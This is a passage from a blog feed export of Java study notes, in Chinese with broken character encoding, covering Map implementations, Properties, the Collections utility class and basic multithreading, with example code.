threshold:æ‰©å®¹çš„ä¸´ç•Œå€¼ï¼Œ=å®¹é‡*å¡«å……å› å­:16* 0.75 =&gt;12 * TREEIFY_THRESHOLD: Bucketä¸­é“¾è¡¨é•¿åº¦å¤§äºè¯¥é»˜è®¤å€¼ï¼Œè½¬åŒ–ä¸ºçº¢é»‘æ ‘:8 * MIN_TREEIFY_CAPACITY:æ¡¶ä¸­çš„Nodeè¢«æ ‘åŒ–æ—¶æœ€å°çš„hashè¡¨å®¹é‡:64 * * * * é¢è¯•é¢˜: * 1.HashMapçš„åº•å±‚å®ç°åŸç†(é‡ç‚¹) * 2.HashMapå’ŒHashtableåŒºåˆ« * 3.CurrentHashMapä¸HashtableåŒºåˆ« * * * * å››ã€LinkedHashMapçš„åº•å±‚å®ç°: * static class Entry&lt;K,V&gt; extends HashMap.Node&lt;K,V&gt; { * Entry&lt;K,V&gt; before, after; //èƒ½å¤Ÿè®°å½•æ·»åŠ çš„å…ƒç´ çš„å…ˆåé¡ºåº * Entry(int hash, K key, V value, Node&lt;K,V&gt; next) { * super(hash, key, value, next); * } * } * * * * äº”ã€Mapä¸­å¸¸ç”¨çš„æ–¹æ³• * * * å…­ã€TreeMap * //å‘TreeMapä¸­æ·»åŠ key-valueï¼Œè¦æ±‚keyå¿…é¡»æ˜¯ç”±åŒä¸€ä¸ªç±»åˆ›å»ºçš„å¯¹è±¡ * //å› ä¸ºè¦æŒ‰ç…§keyè¿›è¡Œæ’åº:è‡ªç„¶æ’åºã€å®šåˆ¶æ’åº * * * */ public class MapTest { @Test public void test1(){ Map map = new HashMap(); // map = new HashMap(); map.put(null, 123); } @Test public void test2(){ HashMap map = new HashMap(); // map = new HashMap(); map.put(null, 123); } @Test public void test3(){ HashMap map = new HashMap(); map = new LinkedHashMap(); // è®°å½•äº†æ·»åŠ çš„é¡ºåº map.put(123, "AA"); map.put(124, "BB"); map.put(567, "CC"); System.out.println(map); // LinkedHashMap } /* Mapä¸­å¸¸ç”¨çš„æ–¹æ³• */ @Test public void tes4(){ // Object put(Object key, Object value):å°†åˆ¶å®šé”®å€¼å¯¹æ·»åŠ (ä¿®æ”¹)åˆ°å½“å‰mapå¯¹è±¡ä¸­ // void putAll(Map m): å°†mä¸­æ‰€æœ‰é”®å€¼å¯¹å­˜æ”¾åˆ°å½“å‰mapä¸­ // Object remove(Object key): ç§»é™¤æŒ‡å®škeyçš„é”®å€¼å¯¹ï¼Œå¹¶è¿”å›value // void clear(): æ¸…ç©ºå½“å‰mapä¸­çš„æ‰€æœ‰æ•°æ® HashMap map = new HashMap(); //put æ·»åŠ  map.put(123, "AA"); map.put("BB", "222"); map.put(567, "CC"); map.put(56, "CCC"); // putä¿®æ”¹ map.put(56, "566666"); //putAll() HashMap map2 = new HashMap(); map2.put(1, "AA"); map2.put(2, "AB"); map.putAll(map2); //remove Object val = map.remove("BB"); System.out.println(val); System.out.println(map); //clear // map.clear(); System.out.println(map.size()); //å…ƒç´ æŸ¥è¯¢çš„æ“ä½œ: //object get(0bject key):è·å–æŒ‡å®škeyå¯¹åº”çš„vaLue System.out.println(map.get(45)); //boolean containsKey (object key):æ˜¯å¦åŒ…å«æŒ‡å®šçš„key System.out.println(map.containsKey(45)); //boolean containsValue(object value):æ˜¯å¦åŒ…å«æŒ‡å®šçš„value // int size():è¿”å›map ä¸­key-valueå¯¹çš„ä¸ªæ•° //boolean isEmpty():åˆ¤æ–­å½“å‰mapæ˜¯å¦ä¸ºç©º System.out.println(map.isEmpty()); //boolean equals(object obj):åˆ¤æ–­å½“å‰mapå’Œå‚æ•°å¯¹è±¡objæ˜¯å¦ç›¸ç­‰ System.out.println(map.equals(map2)); // å…ƒè§†å›¾æ“ä½œçš„æ–¹æ³•(éå†): // set keySet():è¿”å›æ‰€æœ‰keyæ„æˆçš„Seté›†åˆ // éå†æ‰€æœ‰key Set set = map.keySet(); Iterator iterator = set.iterator(); //å˜æˆsetäº†ï¼Œå°±å¯ä»¥ç”¨è¿­ä»£å™¨äº† while (iterator.hasNext()){ System.out.println(iterator.next()); } // collection values():è¿”å›æ‰€æœ‰valueæ„æˆçš„collectioné›†åˆset entryset():è¿”å›æ‰€æœ‰key-valueå¯¹æ„æˆçš„Seté›†åˆ Collection values = map.values(); for(Object obj: values){ // å˜æˆcollectionsäº†ï¼Œå°±å¯ä»¥ç”¨foreachäº† System.out.println(obj); } //éå†æ‰€æœ‰çš„key-value: // æ–¹å¼1ï¼šentrySet() Set entrySet = map.entrySet(); Iterator iterator1 = entrySet.iterator(); while (iterator1.hasNext()){ Object obj = iterator1.next(); // entrySeté›†åˆä¸­çš„å…ƒç´ éƒ½æ˜¯entry Map.Entry entry = (Map.Entry)obj; System.out.println(entry.getKey() + " --- " + entry.getValue()); } //æ–¹å¼2ï¼š Set set2 = map.keySet(); Iterator iterator2 = set2.iterator(); //å˜æˆsetäº†ï¼Œå°±å¯ä»¥ç”¨è¿­ä»£å™¨äº† while (iterator2.hasNext()){ Object key = iterator2.next(); System.out.println(key+ "&lt;---&gt;" + map.get(key)); } } @Test public void test5(){ //å‘TreeMapä¸­æ·»åŠ key-valueï¼Œè¦æ±‚keyå¿…é¡»æ˜¯ç”±åŒä¸€ä¸ªç±»åˆ›å»ºçš„å¯¹è±¡ // å› ä¸ºè¦æŒ‰ç…§keyè¿›è¡Œæ’åº:è‡ªç„¶æ’åºã€å®šåˆ¶æ’åº // //TreeMapè‡ªç„¶æ’åº TreeMap map = new TreeMap(); Person p1 = new Person("TOm", 18); Person p2 = new Person("Jerry", 18); Person p3 = new Person("Jack", 20); Person p4 = new Person("Rose", 21); Person p5 = new Person("Lura", 22); map.put(p1, 98); map.put(p2, 99); map.put(p3, 100); map.put(p4, 88); map.put(p5, 92); Set entrySet = map.entrySet(); Iterator iterator1 = entrySet.iterator(); while (iterator1.hasNext()){ Object obj = iterator1.next(); // entrySeté›†åˆä¸­çš„å…ƒç´ éƒ½æ˜¯entry Map.Entry entry = (Map.Entry)obj; System.out.println(entry.getKey() + " --- " + entry.getValue()); } // //TreeMapå®šåˆ¶æ’åº TreeMap map2 = new TreeMap(new Comparator() { @Override public int compare(Object o1, Object o2) { // æ¯”è¾ƒå¹´é¾„ if (o1 instanceof Person &amp;&amp; o2 instanceof Person){ Person p1 = (Person)o1; Person p2 = (Person)o2; return Integer.compare(p1.getAge(), p2.getAge()); } throw new RuntimeException("è¾“å…¥çš„ç±»å‹ä¸åŒ¹é…"); } }); Person p11 = new Person("TOm", 18); Person p21 = new Person("Jerry", 18); Person p31 = new Person("Jack", 20); Person p41 = new Person("Rose", 21); Person p51 = new Person("Lura", 22); map2.put(p11, 98); map2.put(p21, 99); map2.put(p31, 100); map2.put(p41, 88); map2.put(p51, 92); Set entrySet2 = map2.entrySet(); Iterator iterator2 = entrySet2.iterator(); while (iterator2.hasNext()){ Object obj = iterator2.next(); // entrySeté›†åˆä¸­çš„å…ƒç´ éƒ½æ˜¯entry Map.Entry entry2 = (Map.Entry)obj; System.out.println(entry2.getKey() + " --- " + entry2.getValue()); } } } Mapå®ç°ç±»ä¹‹å››: Hashtable Hashtableæ˜¯ä¸ªå¤è€çš„ Map å®ç°ç±»ï¼ŒJDK1.0å°±æä¾›äº†ã€‚ä¸åŒäºHashMap,Hashtableæ˜¯çº¿ç¨‹å®‰å…¨çš„ã€‚ Hashtableå®ç°åŸç†å’ŒlHashMapç›¸åŒï¼ŒåŠŸèƒ½ç›¸åŒã€‚åº•å±‚éƒ½ä½¿ç”¨å“ˆå¸Œè¡¨ç»“æ„ï¼ŒæŸ¥è¯¢é€Ÿåº¦å¿«ï¼Œå¾ˆå¤šæƒ…å†µä¸‹å¯ä»¥äº’ç”¨ã€‚ ä¸HashMapä¸åŒï¼ŒHashtableä¸å…è®¸ä½¿ç”¨nullä½œä¸º keyå’Œl value ä¸HashMapä¸€æ ·ï¼ŒHashtable ä¹Ÿä¸èƒ½ä¿è¯å…¶ä¸­Key-Value å¯¹çš„é¡ºåº Hashtableåˆ¤æ–­ä¸¤ä¸ªkeyç›¸ç­‰ã€ä¸¤ä¸ªvalueç›¸ç­‰çš„æ ‡å‡†ï¼Œä¸HashMapä¸€è‡´ã€‚ Mapå®ç°ç±»ä¹‹äº”:Properties Propertiesç±»æ˜¯Hashtableçš„å­ç±»ï¼Œè¯¥å¯¹è±¡ç”¨äºå¤„ç†å±æ€§æ–‡ä»¶ ç”±äºå±æ€§æ–‡ä»¶é‡Œçš„keyã€value éƒ½æ˜¯å­—ç¬¦ä¸²ç±»å‹ï¼Œæ‰€ä»¥ Propertiesé‡Œçš„keyå’Œl valueéƒ½æ˜¯å­—ç¬¦ä¸²ç±»å‹ å­˜å–æ•°æ®æ—¶ï¼Œå»ºè®®ä½¿ç”¨setProperty(String key,String value)æ–¹æ³•å’ŒgetProperty(String key)æ–¹æ³• package cn.xpshuai.java1; import java.io.FileInputStream; import java.io.IOException; import java.util.Properties; /** * @author: å‰‘èƒ†ç´å¿ƒ * @create: 2021-01-28 8:54 * @åŠŸèƒ½ï¼š * * |---- Properties: å¸¸ç”¨æ¥å¤„ç†é…ç½®æ–‡ä»¶ã€‚keyå’Œvalueéƒ½æ˜¯Stringç±»å‹ */ public class PropertiesTest { public static void main(String[] args) throws Exception { FileInputStream fis = null; try{ Properties properties = new Properties(); //é»˜è®¤åœ¨å½“å‰å·¥ç¨‹ä¸‹:xxx.properties fis = new FileInputStream("XXX.properties"); //æ–‡ä»¶æµ properties.load(fis); //åŠ è½½æµå¯¹åº”çš„æ–‡ä»¶ String name = properties.getProperty("name"); //è·å–å±æ€§key String passwd = properties.getProperty("passwd"); System.out.println(name + passwd); fis.close(); }catch (IOException e){ e.printStackTrace(); }finally { if(fis != null){ fis.close(); } } } } Collectionså·¥å…·ç±» Collectionsæ˜¯ä¸€ä¸ªæ“ä½œSetã€listå’ŒlMapç­‰é›†åˆçš„å·¥å…·ç±» Collectionsä¸­æä¾›äº†ä¸€ç³»åˆ—é™æ€çš„æ–¹æ³•å¯¹é›†åˆå…ƒç´ è¿›è¡Œæ’åºã€æŸ¥è¯¢å’Œä¿®æ”¹ç­‰æ“ä½œï¼Œè¿˜æä¾›äº†å¯¹é›†åˆå¯¹è±¡è®¾ç½®ä¸å¯å˜ã€å¯¹é›†åˆå¯¹è±¡å®ç°åŒæ­¥æ§åˆ¶ç­‰æ–¹æ³• æ’åºæ“ä½œ:(å‡ä¸ºstaticæ–¹æ³•) reverse(List):åè½¬Listä¸­å…ƒç´ çš„é¡ºåº shuffle(List):å¯¹Listé›†åˆå…ƒç´ è¿›è¡Œéšæœºæ’åº sort(List):æ ¹æ®å…ƒç´ çš„è‡ªç„¶é¡ºåºå¯¹æŒ‡å®šListé›†åˆå…ƒç´ æŒ‰å‡åºæ’åº sort(Listï¼ŒComparator):æ ¹æ®æŒ‡å®šçš„Comparatoräº§ç”Ÿçš„é¡ºåºå¯¹Listé›†åˆå…ƒç´ è¿›è¡Œæ’åºwap(Listï¼Œintï¼Œint):å°†æŒ‡å®šlisté›†åˆä¸­çš„iå¤„å…ƒç´ å’Œjå¤„å…ƒç´ è¿›è¡Œäº¤æ¢ Collectionså¸¸ç”¨æ–¹æ³•æŸ¥æ‰¾ã€æ›¿æ¢ Object max(Collection):æ ¹æ®å…ƒç´ çš„è‡ªç„¶é¡ºåºï¼Œè¿”å›ç»™å®šé›†åˆä¸­çš„æœ€å¤§å…ƒç´ Object max(Collectionï¼ŒComparator):æ ¹æ®ComparatoræŒ‡å®šçš„é¡ºåºï¼Œè¿”å›ç»™å®šé›†åˆä¸­çš„æœ€å¤§å…ƒç´  oobject min(Collection) oObject min(Collectionï¼ŒComparator) int frequency(Collectionï¼ŒObject):è¿”å›æŒ‡å®šé›†åˆä¸­æŒ‡å®šå…ƒç´ çš„å‡ºç°æ¬¡æ•° void copy(List dest,List src):å°†srcä¸­çš„å†…å®¹å¤åˆ¶åˆ°destä¸­ boolean replaceAll(List listï¼ŒObject oldValï¼ŒObject newVal):ä½¿ç”¨æ–°å€¼æ›¿æ¢Listå¯¹è±¡çš„æ‰€æœ‰æ—§å€¼ package cn.xpshuai.java1; import org.junit.Test; import java.util.ArrayList; import java.util.Arrays; import java.util.Collections; import java.util.List; /** * @author: å‰‘èƒ†ç´å¿ƒ * @create: 2021-01-28 9:07 * @åŠŸèƒ½ï¼šCollections:æ“ä½œCollectionã€Mapçš„å·¥å…·ç±» * * * é¢è¯•é¢˜:Collection å’ŒCollectionsåŒºåˆ«ï¼Ÿ * * * * å¸¸ç”¨æ–¹æ³•ï¼š * reverse(List):åè½¬Listä¸­å…ƒç´ çš„é¡ºåº * shuffle(list):å¯¹Listé›†åˆå…ƒç´ è¿›è¡Œéšæœºæ’åº * sort(List):æ ¹æ®å…ƒç´ çš„è‡ªç„¶é¡ºåºå¯¹æŒ‡å®šListé›†åˆå…ƒç´ æŒ‰å‡åºæ’åº * sort(Listï¼ŒComparator):æ ¹æ®æŒ‡å®šçš„Comparatoräº§ç”Ÿçš„é¡ºåºå¯¹Listé›†åˆå…ƒç´ è¿›è¡Œæ’åº * swap(Listï¼Œ intï¼Œint):å°†æŒ‡å®šlisté›†åˆä¸­çš„iå¤„å…ƒç´ å’Œjå¤„å…ƒç´ è¿›è¡Œäº¤æ¢ * object max(Collection):æ ¹æ®å…ƒç´ çš„è‡ªç„¶é¡ºåºï¼Œè¿”å›ç»™å®šé›†åˆä¸­çš„æœ€å¤§å…ƒç´  * object max(collectionï¼ŒComparator):æ ¹æ®ComparatoræŒ‡å®šçš„é¡ºåºï¼Œè¿”å›ç»™å®šé›†åˆä¸­çš„æœ€ * object min(collection) * object min(colLectionï¼ŒComparator) * int frequency(collectionï¼Œobject):è¿”å›æŒ‡å®šé›†åˆä¸­æŒ‡å®šå…ƒç´ çš„å‡ºç°æ¬¡æ•° * void copy(List dest,List src):å°†srcä¸­çš„å†…å®¹å¤åˆ¶åˆ°destä¸­ * boolean replaceAlL(List listï¼Œobject oldvalï¼Œobject newVal):ä½¿ç”¨æ–°å€¼æ›¿æ¢Listå¯¹ * * * */ public class CollectionsTest { @Test public void test(){ List list = new ArrayList(); list.add(132); list.add(55); list.add(666); list.add(666); list.add(-8); list.add(100); list.add(99); Collections.reverse(list); System.out.println(list); // listä¹Ÿæ”¹å˜äº†é¡ºåºå“¦ Collections.shuffle(list); System.out.println(list); Collections.sort(list); Collections.swap(list, 1,2); //äº¤æ¢ä¸¤ä¸ªç´¢å¼•çš„ä½ç½® System.out.println(list); Collections.frequency(list,666); //å‡ºç°æ¬¡æ•° // copy(List dst, List src): å°†srcçš„å†…å®¹å¤åˆ¶åˆ°dstä¸­ //æ˜“é”™ç‚¹: dstçš„é•¿åº¦ä¸èƒ½æ¯”srcå° //é”™è¯¯å†™æ³• // List dst = new ArrayList(); // Collections.copy(dst, list); // System.out.println(dst); //æ¯”è¾ƒæ ‡å‡†çš„å†™æ³• List dst = Arrays.asList(new Object[list.size()]); // nä¸ªnull Collections.copy(dst, list); System.out.println(dst); //synchronizedXXX()æ–¹æ³• //Collectionsç±»ä¸­æä¾›äº†å¤šä¸ªsynchronizedXxx()æ–¹æ³•ï¼Œè¯¥æ–¹æ³•å¯ä½¿å°†æŒ‡å®šé›†åˆåŒ…è£…æˆçº¿ç¨‹åŒæ­¥çš„é›†åˆï¼Œä»è€Œå¯ä»¥è§£å†³å¤šçº¿ç¨‹å¹¶å‘è®¿é—®é›†åˆæ—¶çš„çº¿ç¨‹å®‰å…¨é—®é¢˜ ///è¿”å›çš„List1å³ä¸ºçº¿ç¨‹å®‰å…¨çš„List List list1 = Collections.synchronizedList(list); } } document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Javaå­¦ä¹ </category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>é›†åˆ</tag>
        <tag>HashMap</tag>
        <tag>List</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Javaå­¦ä¹ ä¹‹å¤šçº¿ç¨‹]]></title>
    <url>%2Fposts%2F27205%2F</url>
    <content type="text"><![CDATA[åŸºæœ¬æ¦‚å¿µ JVMå†…å­˜ç»“æ„ï¼š å•æ ¸CPUå’Œå¤šæ ¸CPUçš„ç†è§£ï¼š å•æ ¸ï¼šå…¶å®æ˜¯ä¸€ç§å‡çš„å¤šçº¿ç¨‹ã€‚å› ä¸ºåœ¨ä¸€ä¸ªæ—¶é—´å•å…ƒå†…ï¼Œä¹Ÿåªèƒ½æ‰§è¡Œä¸€ä¸ªçº¿ç¨‹çš„ä»»åŠ¡ã€‚ å¤šæ ¸ï¼šå¦‚æœæ˜¯å¤šæ ¸çš„è¯ï¼Œæ‰èƒ½æ›´å¥½çš„å‘æŒ¥å¤šçº¿ç¨‹çš„æ•ˆç‡ã€‚ï¼ˆç°åœ¨çš„æœåŠ¡å™¨éƒ½æ˜¯å¤šæ ¸çš„) ä¸€ä¸ªJavaåº”ç”¨ç¨‹åºjava.exeï¼Œå…¶å®è‡³å°‘æœ‰ä¸‰ä¸ªçº¿ç¨‹ï¼šmain()ä¸»çº¿ç¨‹ï¼Œgc()åƒåœ¾å›æ”¶çº¿ç¨‹ï¼Œå¼‚å¸¸å¤„ç†çº¿ç¨‹ã€‚å½“ç„¶å¦‚æœå‘ç”Ÿå¼‚å¸¸ï¼Œä¼šå½±å“ä¸»çº¿ç¨‹ã€‚ å¹¶è¡Œï¼šå¤šä¸ªCPUåŒæ—¶æ‰§è¡Œå¤šä¸ªä»»åŠ¡ã€‚æ¯”å¦‚:å¤šä¸ªäººåŒæ—¶åšä¸åŒçš„äº‹ã€‚ å¹¶å‘ï¼šä¸€ä¸ªCPU(é‡‡ç”¨æ—¶é—´ç‰‡)åŒæ—¶æ‰§è¡Œå¤šä¸ªä»»åŠ¡ã€‚æ¯”å¦‚:ç§’æ€ã€å¤šä¸ªäººåšåŒä¸€ä»¶äº‹ ä½¿ç”¨å¤šçº¿ç¨‹çš„ä¼˜ç‚¹ï¼š æé«˜åº”ç”¨ç¨‹åºçš„å“åº”ã€‚å¯¹å›¾å½¢åŒ–ç•Œé¢æ›´æœ‰æ„ä¹‰ï¼Œå¯å¢å¼ºç”¨æˆ·ä½“éªŒã€‚ æé«˜è®¡ç®—æœºç³»ç»ŸCPUçš„åˆ©ç”¨ç‡ æ”¹å–„ç¨‹åºç»“æ„ã€‚å°†æ—¢é•¿åˆå¤æ‚çš„è¿›ç¨‹åˆ†ä¸ºå¤šä¸ªçº¿ç¨‹ï¼Œç‹¬ç«‹è¿è¡Œï¼Œåˆ©äºç†è§£å’Œä¿®æ”¹ ä½•æ—¶éœ€è¦å¤šçº¿ç¨‹ï¼š ç¨‹åºéœ€è¦åŒæ—¶æ‰§è¡Œä¸¤ä¸ªæˆ–å¤šä¸ªä»»åŠ¡ã€‚ ç¨‹åºéœ€è¦å®ç°ä¸€äº›éœ€è¦ç­‰å¾…çš„ä»»åŠ¡æ—¶ï¼Œå¦‚ç”¨æˆ·è¾“å…¥ã€æ–‡ä»¶è¯»å†™æ“ä½œã€ç½‘ç»œæ“ä½œã€æœç´¢ç­‰ã€‚ éœ€è¦ä¸€äº›åå°è¿è¡Œçš„ç¨‹åºæ—¶ã€‚ çº¿ç¨‹çš„åˆ›å»ºå’Œä½¿ç”¨ å…±å››ç§ï¼š1.ç»§æ‰¿ä¸Threadç±»ï¼›2.å®ç°Runnableæ¥å£ï¼› 3.å®ç°Callableæ¥å£ï¼› 4.çº¿ç¨‹æ±  Javaè¯­è¨€çš„JVMå…è®¸ç¨‹åºè¿è¡Œå¤šä¸ªçº¿ç¨‹ï¼Œå®ƒé€šè¿‡java.lang.Threadç±»æ¥ä½“ç°ã€‚ Threadç±»çš„ç‰¹æ€§ï¼š æ¯ä¸ªçº¿ç¨‹éƒ½æ˜¯é€šè¿‡æŸä¸ªç‰¹å®šThreadå¯¹è±¡çš„run()æ–¹æ³•æ¥å®Œæˆæ“ä½œçš„ï¼Œç»å¸¸æŠŠrun()æ–¹æ³•çš„ä¸»ä½“ç§°ä¸ºçº¿ç¨‹ä½“é€šè¿‡è¯¥Threadå¯¹è±¡çš„start()æ–¹æ³•æ¥å¯åŠ¨è¿™ä¸ªçº¿ç¨‹ï¼Œè€Œéç›´æ¥è°ƒç”¨run() æ–¹æ³•1ï¼šç»§æ‰¿äºThreadç±»æ­¥éª¤ï¼š åˆ›å»ºä¸€ä¸ªç»§æ‰¿ä¸Thraedçš„å­ç±» é‡å†™Threadç±»çš„run()æ–¹æ³•â€“&gt;å°†æ­¤çº¿ç¨‹è¦æ‰§è¡Œçš„æ“ä½œå†™åœ¨è¯¥æ–¹æ³•å†… åˆ›å»ºThreadç±»çš„å­å¯¹è±¡ é€šè¿‡æ­¤å¯¹è±¡è°ƒç”¨start()æ–¹æ³• ä¾‹å­ï¼šå¤šçº¿ç¨‹éå†100ä»¥å†…æ‰€æœ‰å¶æ•° package cn.xpshuai.java1; /** * @author: å‰‘èƒ†ç´å¿ƒ * @create 2021-01-16 14:21 * ç¨‹åºï¼šæŒ‡ä¸€æ®µé™æ€çš„ä»£ç  è¿›ç¨‹ï¼šæ­£åœ¨è¿è¡Œçš„ä¸€ä¸ªç¨‹åºï¼Œæ˜¯èµ„æºåˆ†é…çš„å•ä½ï¼Œç³»ç»Ÿä¼šä¸ºæ¯ä¸ªè¿›ç¨‹åˆ†é…Wieä¸åŒçš„å†…å­˜åŒºåŸŸæ˜¯åŠ¨æ€çš„ã€‚ çº¿ç¨‹ï¼šè°ƒåº¦å’Œæ‰§è¡Œçš„å•ä½ï¼Œæ¯ä¸ªçº¿ç¨‹æ‹¥æœ‰ç‹¬ç«‹çš„è¿è¡Œæ ˆå’Œç¨‹åºè®¡æ•°å™¨ï¼Œçº¿ç¨‹åˆ‡æ¢çš„å¼€é”€å° è¿›ç¨‹å¯ä»¥ç»†åŒ–ä¸ºçº¿ç¨‹ï¼Œçº¿ç¨‹æ˜¯ä¸€ä¸ªé™ˆæ—­å†…éƒ¨çš„ä¸€æ¡æ‰§è¡Œè·¯å¾„ å¤šä¸ªçº¿ç¨‹æ“ä½œå…±äº«çš„ç³»ç»Ÿèµ„æº(è¿›ç¨‹ä¸­çš„æ–¹æ³•åŒºå’Œå †)å¯èƒ½å¸¦æ¥å®‰å…¨éšæ‚£ã€‚ ã€åˆ›å»ºå¤šçº¿ç¨‹ã€‘ ã€æ–¹å¼1ã€‘ï¼šç»§æ‰¿Threadç±» 1.åˆ›å»ºä¸€ä¸ªç»§æ‰¿ä¸Thraedçš„å­ç±» 2.é‡å†™Threadç±»çš„run()æ–¹æ³•--&gt;å°†æ­¤çº¿ç¨‹è¦æ‰§è¡Œçš„æ“ä½œå†™åœ¨è¯¥æ–¹æ³•å†… 3.åˆ›å»ºThreadç±»çš„å­å¯¹è±¡ 4.é€šè¿‡æ­¤å¯¹è±¡è°ƒç”¨start()æ–¹æ³• ä¾‹å­ï¼šéå†100ä»¥å†…æ‰€æœ‰å¶æ•° * */ public class MultiThreadsTest { public static void main(String[] args) { //3.åˆ›å»ºThreadç±»çš„å­å¯¹è±¡ MyThread1 myThread1 = new MyThread1(); // alt + enter è‡ªåŠ¨åˆ›å»ºå¯¹è±¡ //4.é€šè¿‡æ­¤å¯¹è±¡è°ƒç”¨start()æ–¹æ³•ï¼š(1)å¯åŠ¨å½“å‰çº¿ç¨‹ (2)è°ƒç”¨å½“å‰çº¿ç¨‹çš„run() myThread1.start(); // é—®é¢˜1ï¼šä¸èƒ½é€šè¿‡ç›´æ¥è°ƒç”¨run()çš„æ–¹å¼å¯åŠ¨çº¿ç¨‹ // myThread1.run(); // é—®é¢˜2ï¼šå†å¯åŠ¨ä¸€ä¸ªçº¿ç¨‹ï¼Œéå†100ä»¥å†…å¶æ•°ï¼Œä¸å¯ä»¥è¿˜è®©å·²ç»start()çš„çº¿ç¨‹å»æ‰§è¡Œ // ä½†æ˜¯å¯ä»¥newä¸€ä¸ªæ–°çš„çº¿ç¨‹çš„å¯¹è±¡ï¼Œå†å»å¯åŠ¨ MyThread1 myThread2 = new MyThread1(); myThread2.start(); //å¦‚ä¸‹æ“ä½œä»ç„¶æ˜¯åœ¨mainçº¿ç¨‹ä¸­æ‰§è¡Œçš„ for (int i = 0; i &lt; 100; i++) { System.out.println("hello"); //helloåœ¨å“ªè¾“å‡ºæ˜¯ä¸ç¡®å®šçš„ System.out.println(Thread.currentThread().getName() + ":" + i); //æŸ¥çœ‹çº¿ç¨‹å } } } //1.åˆ›å»ºä¸€ä¸ªç»§æ‰¿ä¸Thraedçš„å­ç±» class MyThread1 extends Thread{ //2.é‡å†™Threadç±»çš„run()æ–¹æ³• @Override public void run() { //æ–¹æ³•ä½“é‡Œé¢ï¼Œè¦å†™è¦åšçš„äº‹ for (int i = 0; i &lt; 100; i++) { if(i % 2 == 0){ System.out.println(Thread.currentThread().getName() + ":" + i); } } } } ä¾‹å­ï¼šåˆ›å»ºä¸¤ä¸ªåˆ†çº¿ç¨‹ï¼Œå…¶ä¸­ä¸€ä¸ªéå†100ä»¥å†…å¶æ•°ï¼Œå¦å¤–ä¸€ä¸ªéå†100ä»¥å†…åŸºæ•°(ä¸¤ä¸ªçº¿ç¨‹åšçš„äº‹æƒ…ä¸ä¸€æ ·) package cn.xpshuai.java1; /** * @author: å‰‘èƒ†ç´å¿ƒ * @create 2021-01-16 16:11 * ç»ƒä¹ ï¼šåˆ›å»ºä¸¤ä¸ªåˆ†çº¿ç¨‹ï¼Œå…¶ä¸­ä¸€ä¸ªéå†100ä»¥å†…å¶æ•°ï¼Œå¦å¤–ä¸€ä¸ªéå†100ä»¥å†…åŸºæ•°(ä¸¤ä¸ªçº¿ç¨‹åšçš„äº‹æƒ…ä¸ä¸€æ ·) */ public class ThreadCase { public static void main(String[] args) { //å¯ä»¥å†™ä¸¤ä¸ªï¼Œåˆ†åˆ«è°ƒç”¨ ForDouble m1 = new ForDouble(); ForSingle m2 = new ForSingle(); m1.start(); m2.start(); // æˆ–è€…ï¼šå¦‚æœåªç”¨ä¸€æ¬¡çš„è¯ï¼Œå¯ä»¥åˆ›å»ºThreadç±»çš„åŒ¿åå­ç±»çš„æ–¹æ³• new Thread(){ @Override public void run() { for (int i = 0; i &lt; 100; i++) { if(i % 2 == 0){ System.out.println(Thread.currentThread().getName() + "-- å¶æ•° --" + i); } } } }.start(); new Thread(){ @Override public void run() { for (int i = 0; i &lt; 100; i++) { if(i % 2 != 0){ System.out.println(Thread.currentThread().getName() + "-- å¶æ•° --" + i); } } } }.start(); } } class ForDouble extends Thread{ @Override public void run() { for (int i = 0; i &lt; 100; i++) { if(i % 2 == 0){ System.out.println(Thread.currentThread().getName() + "-- å¶æ•° --" + i); } } } } class ForSingle extends Thread{ @Override public void run() { for (int i = 0; i &lt; 100; i++) { if(i % 2 != 0){ System.out.println(Thread.currentThread().getName() + "-- å¥‡æ•° --" + i); } } } } ä¸å®Œå–„çš„ä¾‹å­2ï¼šç»§æ‰¿Threadæ–¹å¼ï¼Œå®ç°å¤šçº¿ç¨‹ä¸‰ä¸ªçª—å£å”®ç¥¨ï¼Œæ€»ç¥¨æ•°ä¸º100å¼ ä¾‹å­ï¼ˆå¾…å®ç°çº¿ç¨‹å®‰å…¨é—®é¢˜ï¼‰ package cn.xpshuai.java1; /** * @author: xps * @create 2021-01-16 17:30 * @åŠŸèƒ½ï¼šç»§æ‰¿Threadæ–¹å¼ï¼Œå®ç°å¤šçº¿ç¨‹ä¸‰ä¸ªçª—å£å”®ç¥¨ï¼Œæ€»ç¥¨æ•°ä¸º100å¼ ä¾‹å­ */ public class ThreadCase2 { public static void main(String[] args) { Windows w1 = new Windows(); Windows w2 = new Windows(); Windows w3 = new Windows(); w1.setName("çª—å£1"); w2.setName("çª—å£2"); w3.setName("çª—å£3"); w1.start(); w2.start(); w3.start(); } } class Windows extends Thread{ // private int tickets = 100; //è¿™æ ·åªæ˜¯å®ä¾‹çš„å˜é‡ï¼Œä¼šå–300å¼  private static int tickets = 100; //åŠ äº†staticä¹Ÿä¸å¯¹ï¼Œéœ€è¦è§£å†³çº¿ç¨‹å®‰å…¨é—®é¢˜ @Override public void run() { while (true){ if (tickets > 0){ System.out.println(Thread.currentThread().getName() + ":å–ç¥¨ï¼Œç¥¨å·ä¸ºï¼š" + tickets); tickets--; }else { break; } } } } æ–¹æ³•2ï¼šå®ç°Runnableæ¥å£çš„æ–¹å¼æ­¥éª¤ï¼š åˆ›å»ºä¸€ä¸ªå®ç°äº†Runnableæ¥å£çš„ç±» å®ç°Runnableä¸­çš„æŠ½è±¡æ–¹æ³•: run() åˆ›å»ºå®ç°ç±»çš„å¯¹è±¡ å°†æ­¤å¯¹è±¡ä½œä¸ºå‚æ•°ä¼ é€’åˆ°Threadç±»çš„æ„é€ å™¨ä¸­ï¼Œåˆ›å»ºThreadçš„å¯¹è±¡ é€šè¿‡Threadçš„å¯¹è±¡è°ƒç”¨start() package cn.xpshuai.java1; /** * @author: å‰‘èƒ†ç´å¿ƒ * @create 2021-01-16 17:48 * @åŠŸèƒ½ï¼š * * * ã€åˆ›å»ºå¤šçº¿ç¨‹çš„æ–¹å¼2ã€‘ï¼šå®ç°Runnableæ¥å£çš„æ–¹å¼ * 1.åˆ›å»ºä¸€ä¸ªå®ç°äº†Runnableæ¥å£çš„ç±» * 2.å®ç°Runnableä¸­çš„æŠ½è±¡æ–¹æ³•: run() * 